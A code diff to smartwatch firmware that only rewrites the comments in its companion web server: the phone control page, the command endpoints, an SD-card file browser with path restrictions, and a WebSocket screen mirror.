 "border:1px solid var(--edge);border-radius:12px;padding:14px;margin:6px 0 2px;cursor:pointer;font:inherit}"
 ".mircard:active{border-color:var(--accent)}"
 "#mir{width:150px;height:auto;border-radius:16px;background:#000;border:1px solid var(--edge);"
 "image-rendering:auto}"
 ".mirhint{font-size:11px;color:var(--dim);letter-spacing:.06em;text-transform:uppercase}"
-/* full-screen interactive control stage */
+/* the full-screen interactive control stage */
 "#stage{position:fixed;inset:0;background:#050506;z-index:20;display:none;flex-direction:column;"
 "align-items:center;padding:8px 6px 12px}#stage.open{display:flex}"
 ".stagetop{display:flex;justify-content:space-between;width:100%;max-width:520px;margin-bottom:8px}"
-/* exact watch aspect so touch maps 1:1 (no letterbox); the canvas backing fills it, CSS scales up */
+/* matches the watch's exact aspect ratio so touch maps 1:1 with no letterboxing; the canvas backing fills it, and CSS scales it up */
 "#mirbig{aspect-ratio:410/502;max-width:100%;max-height:calc(100vh - 168px);border-radius:26px;"
 "background:#000;border:1px solid var(--edge);touch-action:none}"
 ".sbtns{display:flex;gap:14px;width:100%;max-width:520px;margin-top:12px}"
@@ -3628,7 +3784,7 @@ static const char COMP_PAGE_HTML[] =
 "font-size:14px;padding:10px 16px;cursor:pointer;-webkit-tap-highlight-color:transparent;user-select:none}"
 ".sbtn.big{flex:1;padding:16px;font-size:16px}.sbtn:active{border-color:var(--accent);color:#fff}"
 ".sbtn.on{border-color:var(--accent);background:#241f38;color:#fff}"
-/* P4 /sd file browser card */
+/* the P4 /sd file browser card */
 ".fbar{display:flex;align-items:center;gap:8px;margin-bottom:6px}"
 "#fpath{flex:1;font-size:12px;color:var(--dim);word-break:break-all}"
 ".fbtn{background:#1b1b21;border:1px solid var(--edge);border-radius:8px;color:var(--ink);font:inherit;"
@@ -3662,11 +3818,13 @@ static const char COMP_PAGE_HTML[] =
 "<input class='sl' id='br' type='range' min='24' max='255' value='200'>"
 "<div class='slabel'>volume <span id='vov'></span></div>"
 "<input class='sl' id='vo' type='range' min='0' max='255' value='170'></div>"
-/* P4: the microSD browser — tap a folder to open it, a file to download it; upload into the current
- * folder; del removes one file after a confirm. */
+/* P4: the microSD browser — tapping a folder opens it, tapping a file
+ * downloads it; uploading goes into the current folder; delete removes one
+ * file after a confirmation prompt. */
 "<div class='ct'>files</div><div class='card'>"
-/* the upload control is a <label> for the file input (iOS Safari ignores a scripted .click() on a
- * display:none file input); the input itself stays in the layout but invisible (1px, opacity 0) */
+/* The upload control is a <label> wrapping the file input, since iOS
+ * Safari ignores a scripted .click() on a display:none file input; the
+ * input itself stays in the layout but invisible (1px, opacity 0). */
 "<div class='fbar'><span id='fpath'>/sd</span><button class='fbtn' id='fup'>\xE2\x86\x91 up</button>"
 "<label class='fbtn' for='ffile'>upload</label></div>"
 "<div id='flist'><div class='sub' style='margin:4px 0'>loading\xE2\x80\xA6</div></div><div id='fprog'></div>"
@@ -3694,7 +3852,7 @@ static const char COMP_PAGE_HTML[] =
 "function launch(id,warn,label){"
 "if(warn&&!confirm('\"'+label+'\" uses the radio and may drop this connection. Continue?'))return;"
 "post('/api/launch',{id:id});}"
-/* recursive render: a row with a nested "sub" array toggles its children (tree); a leaf launches */
+/* a recursive render: a row with a nested "sub" array toggles its children like a tree; a leaf row launches something */
 "function renderRows(rows,box,depth){rows.forEach(function(r){"
 "var sub=r.sub&&r.sub.length;"
 "var b=document.createElement('button');b.className=(!r.en&&!sub)?'mrow dim':'mrow';"
@@ -3730,7 +3888,7 @@ static const char COMP_PAGE_HTML[] =
 "else if(e.key==='Backspace'){e.preventDefault();post('/api/key',{key:'backspace'});}});"
 "var lastFocus=false;"
 "function apply(j){"
-"if(j.accent)document.documentElement.style.setProperty('--accent','#'+j.accent);"   /* the watch's Theme accent */
+"if(j.accent)document.documentElement.style.setProperty('--accent','#'+j.accent);"   /* the watch's own Theme accent color */
 "$('name').textContent=j.name||'\xE2\x80\x94';$('screen').textContent=j.screen||'\xE2\x80\x94';"
 "$('batt').textContent=(j.batt|0)+'%';$('cli').textContent=j.clients|0;"
 "var t=$('toggles').children;t[0].classList.toggle('on',!!j.flash);"
@@ -3742,7 +3900,7 @@ static const char COMP_PAGE_HTML[] =
 "lastFocus=!!j.focused;}"
 "function online(o){$('dot').classList.toggle('off',!o);"
 "$('stat').textContent=o?'companion control surface \xC2\xB7 connected':'reconnecting\xE2\x80\xA6';}"
-/* live screen mirror: decode a binary RGB565-LE frame (8-byte header 'N','F',w16,h16,fmt,rsv) to canvas */
+/* live screen mirror: decodes a binary RGB565-LE frame — an 8-byte header 'N','F',w16,h16,fmt,rsv — onto the canvas */
 "function drawThumb(buf){var dv=new DataView(buf);"
 "if(dv.byteLength<8||dv.getUint8(0)!==78||dv.getUint8(1)!==70)return;"
 "var w=dv.getUint16(2,true),h=dv.getUint16(4,true);if(dv.byteLength<8+w*h*2)return;"
@@ -3762,7 +3920,7 @@ static const char COMP_PAGE_HTML[] =
 "function startPoll(){if(poll)return;poll=setInterval(function(){"
 "fetch('/api/ping',{cache:'no-store'}).then(function(r){return r.json();})"
 ".then(function(j){online(true);apply(j);}).catch(function(e){online(false);});},2000);}"
-/* ===== interactive control stage: full-screen mirror + touch/button uplink over WS ===== */
+/* ===== interactive control stage: full-screen mirror plus touch/button uplink, over the WS socket ===== */
 "var curCanvas=$('mir');"
 "function wsSend(o){try{if(ws&&ws.readyState===1)ws.send(JSON.stringify(o));}catch(e){}}"
 "var stage=$('stage'),big=$('mirbig'),castOn=false;"
@@ -3787,7 +3945,7 @@ static const char COMP_PAGE_HTML[] =
 "el.addEventListener('pointerup',function(){if(tmr){clearTimeout(tmr);tmr=null;}if(!lng)wsSend({t:'b',k:k,a:'s'});lng=false;});"
 "el.addEventListener('pointerleave',function(){if(tmr){clearTimeout(tmr);tmr=null;}});}"
 "wireBtn('btnfn','fn');wireBtn('btnpwr','pwr');"
-/* ===== P4 /sd file browser: list / download / upload / delete over the companion server ===== */
+/* ===== P4 /sd file browser: list / download / upload / delete, over the companion server ===== */
 "var fcur='/sd';"
 "function esc(s){return String(s).replace(/[&<>\"]/g,function(c){return c==='&'?'&amp;':c==='<'?'&lt;':c==='>'?'&gt;':'&quot;';});}"
 "function fsz(n){return n<1024?n+' B':n<1048576?(n/1024).toFixed(1)+' KB':(n/1048576).toFixed(2)+' MB';}"
@@ -3833,12 +3991,12 @@ static esp_err_t comp_ping_get(httpd_req_t *req)
     char js[512];
     httpd_resp_set_type(req, "application/json");
     httpd_resp_set_hdr(req, "Cache-Control", "no-store");
-    if (s_comp_state_fn) {                 /* P3: the full live-state snapshot (same shape as /ws) */
+    if (s_comp_state_fn) {                 /* P3: the full live-state snapshot, in the same shape as /ws sends */
         js[0] = '\0';
         s_comp_state_fn(js, sizeof js);
         if (js[0]) return httpd_resp_sendstr(req, js);
     }
-    int n = snprintf(js, sizeof js,        /* fallback before the UI registers its state provider */
+    int n = snprintf(js, sizeof js,        /* a fallback used before the UI has registered its own state provider */
                      "{\"name\":\"%s\",\"batt\":%d,\"uptime\":%lld,\"clients\":%d}",
                      nocsif_settings_device_name(), nocsif_power_batt_pct(),
                      (long long)(esp_timer_get_time() / 1000000),
@@ -3846,11 +4004,14 @@ static esp_err_t comp_ping_get(httpd_req_t *req)
     return httpd_resp_send(req, js, n);
 }
 
-/* ---- P2 command channel (phone -> watch) ------------------------------------------------- *
- * Each POST handler runs on the httpd task: read the small JSON body, fill a nocsif_companion_cmd_t,
- * and forward it to the UI-registered handler (which marshals onto the LVGL task). All fire-and-forget
- * (reply {"ok":true} immediately); no LVGL is touched here. Every command is ESP_LOGI'd — the
- * reliability A2 log tee records it to the persistent logbook ring. */
+/* ---- P2 command channel: phone to watch ---- *
+ * Each POST handler runs on the httpd task: it reads the small JSON body,
+ * fills a nocsif_companion_cmd_t, and forwards it to the UI-registered
+ * handler, which marshals the actual work onto the LVGL task. Every one of
+ * these is fire-and-forget — the reply {"ok":true} goes out immediately —
+ * and none of them touch LVGL directly here. Every command is logged with
+ * ESP_LOGI, which the reliability A2 log tee records into the persistent
+ * logbook ring. */
 static esp_err_t comp_read_body(httpd_req_t *req, char *buf, size_t len)
 {
     int total = req->content_len;
@@ -3875,7 +4036,7 @@ static esp_err_t comp_reply(httpd_req_t *req, bool ok)
     return httpd_resp_sendstr(req, ok ? "{\"ok\":true}" : "{\"ok\":false}");
 }
 
-/* Extract a string field from a JSON body into out. False if absent / not a string. */
+/* Extracts a string field from a JSON body into `out`. Returns false if it's absent or not a string. */
 static bool comp_json_str(const char *body, const char *key, char *out, size_t len)
 {
     bool ok = false;
@@ -3891,7 +4052,7 @@ static bool comp_json_str(const char *body, const char *key, char *out, size_t l
     return ok;
 }
 
-/* Extract an integer field (accepts a JSON number or a numeric string) into *out. */
+/* Extracts an integer field, accepting either a JSON number or a numeric string, into *out. */
 static bool comp_json_int(const char *body, const char *key, int *out)
 {
     bool ok = false;
@@ -3905,7 +4066,7 @@ static bool comp_json_int(const char *body, const char *key, int *out)
     return ok;
 }
 
-/* Fill a command and hand it to the UI (if registered + companion is up). */
+/* Fills a command and hands it off to the UI, if a handler is registered and the companion is up. */
 static void comp_dispatch(nocsif_companion_cmd_type_t type, const char *arg)
 {
     nocsif_companion_cmd_t cmd = { .type = type };
@@ -3955,7 +4116,7 @@ static esp_err_t comp_home_post(httpd_req_t *req)
     return comp_reply(req, true);
 }
 
-/* Both sliders carry a 0-255 level; dispatch it as a decimal string (the async UI side clamps). */
+/* Both sliders carry a 0-255 level, dispatched as a decimal string; the async UI side clamps it. */
 static esp_err_t comp_level_post(httpd_req_t *req, nocsif_companion_cmd_type_t type)
 {
     char body[64]; comp_read_body(req, body, sizeof body);
@@ -3969,15 +4130,17 @@ static esp_err_t comp_level_post(httpd_req_t *req, nocsif_companion_cmd_type_t t
 static esp_err_t comp_brightness_post(httpd_req_t *req) { return comp_level_post(req, NOCSIF_COMPANION_CMD_BRIGHTNESS); }
 static esp_err_t comp_volume_post(httpd_req_t *req)     { return comp_level_post(req, NOCSIF_COMPANION_CMD_VOLUME); }
 
-/* GET /api/menu — the watch's live menu tree (3 Home categories → their real rows). The UI fills the
- * JSON from its screen registry (immutable after init) so the page mirrors the device, never a
- * hardcoded grid. Sent chunked-free from a heap buffer (the tree is ~1.5 KB). */
+/* GET /api/menu returns the watch's live menu tree: the 3 Home
+ * categories and their actual rows. The UI fills in the JSON from its own
+ * screen registry, immutable after init, so the page always mirrors the
+ * real device rather than a hardcoded grid. Sent from a heap buffer with no
+ * chunking involved, since the whole tree is only around 1.5 KB. */
 static esp_err_t comp_menu_get(httpd_req_t *req)
 {
     httpd_resp_set_type(req, "application/json");
     httpd_resp_set_hdr(req, "Cache-Control", "no-store");
     if (!s_comp_menu_fn) return httpd_resp_sendstr(req, "{\"cats\":[]}");
-    enum { COMP_MENU_BUF = 8192 };   /* full nested map (~100 nodes) fits with headroom */
+    enum { COMP_MENU_BUF = 8192 };   /* the full nested map, roughly 100 nodes, fits comfortably with headroom to spare */
     char *js = malloc(COMP_MENU_BUF);
     if (!js) return httpd_resp_send_500(req);
     js[0] = '\0';
@@ -3987,19 +4150,28 @@ static esp_err_t comp_menu_get(httpd_req_t *req)
     return r;
 }
 
-/* ---- P4 /sd file browser (folds in PLAN §4.8 "wireless file download from SD") ---------------- *
- *   GET  /api/fs?p=<dir>             JSON {path, ents:[{n,d,s}], trunc} — dirs first, dotfiles hidden
- *   GET  /api/file?p=<file>          the file (chunked; Content-Disposition attachment; X-File-Size)
- *   POST /api/upload?p=<dir>&n=<nm>  raw body → <dir>/<nm> (written to .part, renamed on completion)
- *   POST /api/delete {"p":<file>}    remove ONE regular file (never a directory)
- * All run on the httpd task (PSRAM stack, see companion_httpd_up). Card rules mirror the on-watch Files
- * screen + the §4.10 download: CLAIM the card for the request (refused with the reason while File Share
- * has the drive), take the FAT lock only around each readdir / 8 KB chunk so the rest of the watch keeps
- * its short card accesses, and never hold the lock across a socket send. Paths are JAILED to /sd:
- * absolute, no "." / ".." segment, no empty segment, no control chars or backslashes, length-capped.
- * Mirror frames queue behind a transfer (one httpd task) and resume after it — expected.
- * §4.15: the jail / claim / listing rules moved to sdfs.{h,c} so the desktop bridge shares them. */
-#define COMP_FS_CHUNK     8192                  /* read/write unit under one short card lock */
+/* ---- P4 /sd file browser: implements PLAN section 4.8's "wireless
+ * file download from SD" ---- *
+ *   GET  /api/fs?p=<dir>             returns JSON {path, ents:[{n,d,s}], trunc};
+ *                                     directories listed first, dotfiles hidden
+ *   GET  /api/file?p=<file>          streams the file, chunked, with
+ *                                     Content-Disposition attachment and X-File-Size
+ *   POST /api/upload?p=<dir>&n=<nm>  writes the raw body to <dir>/<nm> (via a
+ *                                     .part file, renamed once complete)
+ *   POST /api/delete {"p":<file>}    removes exactly one regular file, never a directory
+ * All of these run on the httpd task (a PSRAM stack — see
+ * companion_httpd_up). Card access rules mirror the on-watch Files screen
+ * and the section 4.10 download lesson: the card is claimed for the
+ * request (refused with a reason while File Share has the drive), the FAT
+ * lock is only taken around each readdir call or 8 KB chunk so the rest of
+ * the watch keeps its own short card accesses working, and the lock is
+ * never held across a socket send. Paths are jailed to /sd: must be
+ * absolute, no "." or ".." segment, no empty segment, no control characters
+ * or backslashes, and length-capped. Mirror frames simply queue behind an
+ * in-progress transfer on the single httpd task and resume after it — this
+ * is expected behavior. Section 4.15: the jail, claim, and listing rules
+ * moved into sdfs.{h,c} so the desktop bridge can share them too. */
+#define COMP_FS_CHUNK     8192                  /* the read/write unit used under one short card lock */
 
 static esp_err_t comp_fs_err(httpd_req_t *req, const char *status, const char *msg)
 {
@@ -4011,7 +4183,7 @@ static esp_err_t comp_fs_err(httpd_req_t *req, const char *status, const char *m
     return httpd_resp_sendstr(req, js);
 }
 
-/* Query-string value decoding (%XX and '+'). False if the decoded value would not fit. */
+/* Decodes a query-string value (%XX escapes and '+'). Returns false if the decoded result wouldn't fit. */
 static bool comp_url_decode(const char *in, char *out, size_t len)
 {
     size_t o = 0;
@@ -4031,7 +4203,7 @@ static bool comp_url_decode(const char *in, char *out, size_t len)
     return true;
 }
 
-/* One decoded query value. False if absent, truncated, or too long for out. */
+/* One decoded query value. Returns false if it's absent, gets truncated, or is too long for `out`. */
 static bool comp_query(httpd_req_t *req, const char *key, char *out, size_t len)
 {
     char q[CONFIG_HTTPD_MAX_URI_LEN + 1];
@@ -4053,8 +4225,7 @@ static void comp_json_escape(const char *in, char *out, size_t len)
     out[o] = '\0';
 }
 
-/* GET /api/fs?p=<dir> — snapshot the directory (sdfs: claim + short lock), then stream the JSON in
- * chunks with nothing held. */
+/* GET /api/fs?p=<dir> snapshots the directory (via sdfs: claim plus a short lock), then streams the JSON in chunks with nothing held. */
 static esp_err_t comp_fs_list_get(httpd_req_t *req)
 {
     char path[NOCSIF_SDFS_PATH_MAX];
@@ -4093,7 +4264,7 @@ static esp_err_t comp_fs_list_get(httpd_req_t *req)
     return r;
 }
 
-/* GET /api/file?p=<file> — stream the file 8 KB at a time, each read under its own short card lock. */
+/* GET /api/file?p=<file> streams the file 8 KB at a time, each read taking its own short card lock. */
 static esp_err_t comp_fs_file_get(httpd_req_t *req)
 {
     char path[NOCSIF_SDFS_PATH_MAX];
@@ -4117,8 +4288,10 @@ static esp_err_t comp_fs_file_get(httpd_req_t *req)
         return comp_fs_err(req, "500 Internal Server Error", "out of memory");
     }
 
-    /* Header values are referenced (not copied) by httpd until the first chunk goes out — keep them in
-     * this frame. A '"' in a name would break the header; the client names the download anyway. */
+    /* Header values are referenced, not copied, by httpd until the first
+     * chunk actually goes out, so they need to stay alive in this stack frame.
+     * A '"' in a filename would break the header, but the client is the one
+     * naming the download anyway. */
     const char *name = strrchr(path, '/');
     name = name ? name + 1 : path;
     char cd[NOCSIF_SDFS_NAME_MAX + 40], szs[24];
@@ -4151,10 +4324,11 @@ static esp_err_t comp_fs_file_get(httpd_req_t *req)
     return r;
 }
 
-/* POST /api/upload?p=<dir>&n=<name> — the raw body becomes <dir>/<name>: written to <name>.part in 8 KB
- * pieces (each under a short lock), then renamed over any existing file. On a failure the rest of the
- * body is drained here in big reads (httpd would otherwise purge it 32 bytes at a time) so the browser
- * still receives the reason. */
+/* POST /api/upload?p=<dir>&n=<name>: the raw body becomes <dir>/<name>,
+ * written to <name>.part in 8 KB pieces (each under its own short lock),
+ * then renamed over any existing file. On a failure, the rest of the body
+ * is drained here in large reads — otherwise httpd would purge it 32 bytes
+ * at a time — so the browser still receives the actual failure reason. */
 static esp_err_t comp_fs_upload_post(httpd_req_t *req)
 {
     char dir[NOCSIF_SDFS_PATH_MAX], name[NOCSIF_SDFS_NAME_MAX];
@@ -4193,7 +4367,7 @@ static esp_err_t comp_fs_upload_post(httpd_req_t *req)
         if (w != (size_t)r) { err = "card write failed (full?)"; break; }
         got += (size_t)r;
     }
-    if (err && buf && got < total) {                          /* drain so the client sees the reason */
+    if (err && buf && got < total) {                          /* drains the body so the client still sees the failure reason */
         int spins = 0;
         while (got < total && spins < 200) {
             size_t want = total - got;
@@ -4228,9 +4402,11 @@ static esp_err_t comp_fs_upload_post(httpd_req_t *req)
     return httpd_resp_sendstr(req, js);
 }
 
-/* POST /api/delete {"p":"/sd/..."} — one regular file. Directories are refused (no recursive delete
- * from a phone). The body/path buffers are wider than the jail cap so a long path is REJECTED, never
- * silently truncated onto a different name. */
+/* POST /api/delete {"p":"/sd/..."} removes exactly one regular file;
+ * directories are refused, since there's no recursive delete from a phone.
+ * The body/path buffers are wider than the jail's length cap, so an
+ * over-long path is rejected outright, never silently truncated onto a
+ * different file. */
 static esp_err_t comp_fs_delete_post(httpd_req_t *req)
 {
     char body[NOCSIF_SDFS_PATH_MAX + 48], path[NOCSIF_SDFS_PATH_MAX + 48];
@@ -4256,12 +4432,12 @@ static esp_err_t comp_fs_delete_post(httpd_req_t *req)
     return comp_reply(req, true);
 }
 
-/* ---- P3 live-state WebSocket (/ws) ------------------------------------------------------------ */
+/* ---- P3 live-state WebSocket (/ws) ---- */
 static void ws_add_fd(int fd)
 {
     for (int i = 0; i < COMP_WS_MAX; i++) if (s_ws_fds[i] == fd) return;   /* already tracked */
     for (int i = 0; i < COMP_WS_MAX; i++) if (s_ws_fds[i] == 0) { s_ws_fds[i] = fd; return; }
-    /* table full — drop the oldest so a fresh client always connects */
+    /* the table is full: drop the oldest so a fresh client can always connect */
     s_ws_fds[0] = fd;
 }
 static void ws_del_fd(int fd)
@@ -4276,8 +4452,10 @@ int nocsif_wifi_companion_ws_clients(void)
     return n;
 }
 
-/* P3 screen mirror: the UI (LVGL task) hands a fresh RGB565 thumbnail here; we frame it (8-byte header)
- * into the PSRAM buffer under the mutex and bump the seq so the push loop sends it once to each client. */
+/* P3 screen mirror: the UI, on the LVGL task, hands a fresh RGB565
+ * thumbnail here; this frames it with an 8-byte header into the PSRAM
+ * buffer under the mutex and bumps the sequence number, so the push loop
+ * sends it once to each client. */
 void nocsif_wifi_companion_publish_thumb(const uint8_t *rgb565_le, int w, int h)
 {
     if (!s_comp_active || !rgb565_le || w <= 0 || h <= 0) return;
@@ -4289,7 +4467,7 @@ void nocsif_wifi_companion_publish_thumb(const uint8_t *rgb565_le, int w, int h)
         s_thumb[0] = 'N'; s_thumb[1] = 'F';
         s_thumb[2] = (uint8_t)(w & 0xff); s_thumb[3] = (uint8_t)((w >> 8) & 0xff);
         s_thumb[4] = (uint8_t)(h & 0xff); s_thumb[5] = (uint8_t)((h >> 8) & 0xff);
-        s_thumb[6] = 0;  /* fmt: 0 = RGB565 little-endian */
+        s_thumb[6] = 0;  /* fmt 0 means RGB565, little-endian */
         s_thumb[7] = 0;
         memcpy(s_thumb + 8, rgb565_le, payload);
         s_thumb_len = payload + 8;
@@ -4300,22 +4478,26 @@ void nocsif_wifi_companion_publish_thumb(const uint8_t *rgb565_le, int w, int h)
 
 static esp_err_t comp_ws_handler(httpd_req_t *req)
 {
-    if (req->method == HTTP_GET) {                 /* handshake done → track this socket for pushes */
+    if (req->method == HTTP_GET) {                 /* the handshake is done: start tracking this socket for pushes */
         ws_add_fd(httpd_req_to_sockfd(req));
         return ESP_OK;
     }
-    /* Interactive uplink (phone → watch): small JSON control messages on the same socket.
-     *   {"t":"m","x":..,"y":..,"s":0/1}  touch move / press-state (watch-space px)
-     *   {"t":"b","k":"fn"|"pwr","a":"s"|"l"}  side button (short / long)
-     *   {"t":"c","on":0/1}  casting (blank the watch, phone-as-display) */
+    /* Interactive uplink, phone to watch: small JSON control messages on
+     * the same socket.
+     *   {"t":"m","x":..,"y":..,"s":0/1}  a touch move or press-state change (watch-space pixels)
+     *   {"t":"b","k":"fn"|"pwr","a":"s"|"l"}  a side-button press (short or long)
+     *   {"t":"c","on":0/1}  casting toggle (blanks the watch, phone becomes the display) */
     uint8_t buf[128];
     httpd_ws_frame_t f = { .type = HTTPD_WS_TYPE_TEXT, .payload = buf };
     if (httpd_ws_recv_frame(req, &f, sizeof buf - 1) != ESP_OK) {
-        /* The peer reset / closed the socket (Safari backgrounding, a page navigation, a download
-         * hand-off). Returning ESP_OK here made httpd re-poll the DEAD socket in a tight loop (recv
-         * errno 104 then 128, ~3 log lines per ms, CPU 1 pinned) until the task-wdt fired on the starved
-         * IDLE task — the 2026-09-08 reset + the "everything lags" report. Fail the request so httpd
-         * closes the session; the page's ws.onclose reconnects. */
+        /* The peer reset or closed the socket — Safari backgrounding, a page
+         * navigation, a download hand-off. Returning ESP_OK here used to make
+         * httpd keep re-polling the dead socket in a tight loop (recv errno 104
+         * then 128, about 3 log lines per millisecond, pinning CPU 1) until the
+         * task watchdog fired on the starved IDLE task — this was the 2026-09-08
+         * reset and the "everything lags" report. Failing the request instead
+         * makes httpd close the session, so the page's ws.onclose fires and it
+         * reconnects. */
         ws_del_fd(httpd_req_to_sockfd(req));
         return ESP_FAIL;
     }
@@ -4352,24 +4534,31 @@ static esp_err_t comp_ws_handler(httpd_req_t *req)
     return ESP_OK;
 }
 
-/* A push failed on this socket: a timed-out send (errno 11 after the 5 s send-wait — the phone stopped
- * draining) leaves a PARTIAL frame on the wire, so the stream is unusable either way. Drop the fd from
- * the push table AND close the session so the page's ws.onclose fires and it reconnects cleanly (before,
- * only the table entry was dropped: the page kept a silent zombie socket and never reconnected). */
+/* A push failed on this socket: a timed-out send — errno 11, after the
+ * 5s send-wait, meaning the phone stopped draining it — leaves a partial
+ * frame on the wire, so the stream is unusable either way. This drops the
+ * fd from the push table and closes the session, so the page's ws.onclose
+ * fires and it reconnects cleanly. Previously only the table entry was
+ * dropped, leaving the page with a silent zombie socket that never
+ * reconnected. */
 static void ws_drop(httpd_handle_t hd, int fd)
 {
     ws_del_fd(fd);
     httpd_sess_trigger_close(hd, fd);
 }
 
-/* Backpressure for the mirror: true while a thumbnail send is queued/in flight. The 80 ms tick used to
- * queue a fresh send for EVERY new frame regardless; on a congested AP link the httpd task then sat in
- * blocking sends back-to-back (each up to the 5 s send-wait) with a pile of queued work items behind it
- * — every command, touch and page request waited in that line. Now a new frame is only queued once the
- * previous send completed, so the frame rate adapts to what the link actually carries. */
+/* Backpressure for the mirror: true while a thumbnail send is either
+ * queued or in flight. The 80ms tick used to queue a fresh send for every
+ * new frame regardless of whether the last one finished; on a congested AP
+ * link, the httpd task ended up sitting in back-to-back blocking sends
+ * (each up to the 5s send-wait), with a pile of other queued work behind
+ * it — every command, touch, and page request stuck waiting in that same
+ * line. Now a new frame only gets queued once the previous send has
+ * actually completed, so the effective frame rate adapts to what the link
+ * can actually carry. */
 static volatile bool s_thumb_busy;
 
-/* Runs on the httpd task (queued from the timer): send one live-state frame to one client. */
+/* Runs on the httpd task, queued from the timer: sends one live-state frame to one client. */
 typedef struct { httpd_handle_t hd; int fd; } ws_send_ctx_t;
 static void ws_send_worker(void *arg)
 {
@@ -4386,8 +4575,10 @@ static void ws_send_worker(void *arg)
     }
     free(c);
 }
-/* Runs on the httpd task: copy the current thumbnail out under the mutex, then send it as one BINARY
- * frame. Copied (not sent under the lock) so a slow socket never blocks the UI's next publish. */
+/* Runs on the httpd task: copies the current thumbnail out under the
+ * mutex, then sends it as one binary frame. It's copied rather than sent
+ * while holding the lock, so a slow socket can never block the UI's next
+ * publish. */
 static void ws_send_thumb_worker(void *arg)
 {
     ws_send_ctx_t *c = arg;
@@ -4408,9 +4599,11 @@ static void ws_send_thumb_worker(void *arg)
     s_thumb_busy = false;
 }
 
-/* The timer fires fast (~80 ms) to keep the interactive mirror smooth: send a NEW thumbnail frame every
- * tick (when the previous one has gone out — s_thumb_busy), but the (small) state JSON only every ~6th
- * tick (~480 ms) — state is for the dashboard/keyboard, not the frame rate. */
+/* The timer fires quickly, roughly every 80ms, to keep the interactive
+ * mirror smooth: it sends a new thumbnail frame on every tick, as long as
+ * the previous one has already gone out (tracked via s_thumb_busy), but the
+ * (small) state JSON only goes out roughly every 6th tick, about 480ms —
+ * state is meant for the dashboard/keyboard, not for the frame rate. */
 static void ws_push_cb(void *arg)
 {
     (void)arg;
@@ -4431,7 +4624,7 @@ static void ws_push_cb(void *arg)
         if (thumb_new) {
             ws_send_ctx_t *tc = malloc(sizeof *tc);
             if (tc) { tc->hd = s_comp_httpd; tc->fd = fd;
-                      s_thumb_busy = true;   /* before the post: the worker may finish on the other core first */
+                      s_thumb_busy = true;   /* before the post: the worker may already finish on the other core first */
                       if (httpd_queue_work(s_comp_httpd, ws_send_thumb_worker, tc) == ESP_OK) thumb_queued = true;
                       else { free(tc); s_thumb_busy = false; } }
         }
@@ -4477,7 +4670,7 @@ static void companion_httpd_up(void)
     httpd_config_t hc = HTTPD_DEFAULT_CONFIG();
     hc.server_port      = 80;
     hc.stack_size       = 8192;
-    hc.task_caps        = MALLOC_CAP_SPIRAM | MALLOC_CAP_8BIT;   /* P4: PSRAM stack — see the header note */
+    hc.task_caps        = MALLOC_CAP_SPIRAM | MALLOC_CAP_8BIT;   /* P4: a PSRAM stack, see the note in the file header */
     hc.max_uri_handlers = 20;
     hc.lru_purge_enable = true;
     if (httpd_start(&s_comp_httpd, &hc) != ESP_OK) {
@@ -4516,12 +4709,12 @@ static void companion_httpd_up(void)
     httpd_register_uri_handler(s_comp_httpd, &upload);
     httpd_register_uri_handler(s_comp_httpd, &del);
 
-    /* P3 live push: fire the state frame ~2×/s to every connected /ws client. */
+    /* P3 live push: fires a state frame roughly twice a second to every connected /ws client. */
     memset(s_ws_fds, 0, sizeof s_ws_fds);
-    s_thumb_busy = false;   /* a send queued on a server that was stopped never ran — start clean */
+    s_thumb_busy = false;   /* a send queued on a server that has since stopped never actually ran: start clean */
     const esp_timer_create_args_t ta = { .callback = ws_push_cb, .name = "comp_ws" };
     if (esp_timer_create(&ta, &s_ws_timer) == ESP_OK) {
-        esp_timer_start_periodic(s_ws_timer, 80000);    /* 80 ms — smooth interactive mirror (~12 fps) */
+        esp_timer_start_periodic(s_ws_timer, 80000);    /* 80ms, for a smooth interactive mirror at roughly 12fps */
     }
 }
 
@@ -4540,9 +4733,12 @@ static void companion_httpd_down(void)
     s_comp_httpd = NULL;
 }
 
-/* Drop just the companion HTTP + mDNS layer and clear its AP overrides — leaves the AP running (like
- * portal_stop). Called by ap_teardown (so ANY AP drop, e.g. a STA scan/join, removes the surface
- * cleanly) and by do_companion_off. Idempotent. Does NOT tear the AP down (the caller decides). */
+/* Drops just the companion HTTP and mDNS layer and clears its AP
+ * overrides, leaving the AP itself running — the same as portal_stop.
+ * Called by ap_teardown, so any AP drop at all (e.g. a STA scan or join)
+ * cleanly removes the surface too, and also called directly by
+ * do_companion_off. Safe to call more than once. Does not tear the AP
+ * itself down — that's left to the caller. */
 static void companion_stop(void)
 {
     if (!s_comp_active && s_comp_httpd == NULL && !s_mdns_up) {
@@ -4568,9 +4764,11 @@ static void do_companion_on(void)
         return;
     }
 
-    /* Single radio: the companion AP is exclusive with the promiscuous monitor/parser and the captive
-     * portal (which also owns port 80). Stop them first. Any OPEN software AP that was up is cycled so
-     * companion always owns a clean open AP (simple invariant). Bluetooth stays as it is. */
+    /* With only one radio: the companion AP is mutually exclusive with the
+     * promiscuous monitor/parser and with the captive portal, which also owns
+     * port 80. Both are stopped first. Any open software AP that was already
+     * up gets cycled, so the companion always owns a clean, fresh open AP —
+     * a simple invariant to maintain. Bluetooth is left exactly as it is. */
     monitor_teardown();
     portal_stop();
     if (s_ap_active) {
@@ -4579,13 +4777,15 @@ static void do_companion_on(void)
 
     comp_ssid_build();
 
-    /* Stage the companion SSID + optional WPA2 password, then reuse the shipped AP bring-up. A password
-     * of < 8 chars (WPA2's minimum) is treated as none → OPEN, so a stray short value can't brick join. */
+    /* Stages the companion SSID and optional WPA2 password, then reuses
+     * the already-shipped AP bring-up. A password shorter than 8 characters
+     * (WPA2's minimum) is treated as none, meaning open, so a stray short
+     * value can never brick the join. */
     snprintf(s_ap_ssid_ov, sizeof s_ap_ssid_ov, "%s", s_comp_ssid);
     nocsif_settings_get_str(K_COMP_PW, s_ap_pass_ov, sizeof s_ap_pass_ov, "");
     if (strlen(s_ap_pass_ov) < 8) s_ap_pass_ov[0] = '\0';
     do_ap_on();
-    if (!s_ap_active) {                               /* AP failed -> roll the override back */
+    if (!s_ap_active) {                               /* the AP failed to come up: roll the override back */
         s_ap_ssid_ov[0] = '\0';
         s_ap_pass_ov[0] = '\0';
         publish_status("err");
@@ -4594,11 +4794,11 @@ static void do_companion_on(void)
     }
     s_comp_owns_ap = true;
 
-    companion_mdns_up();                              /* best-effort: AP IP still works without it */
+    companion_mdns_up();                              /* best-effort only: the AP's IP address still works fine without it */
     companion_httpd_up();
-    if (s_comp_httpd == NULL) {                       /* HTTP is mandatory -> roll the whole session back */
+    if (s_comp_httpd == NULL) {                       /* HTTP is mandatory: roll the whole session back */
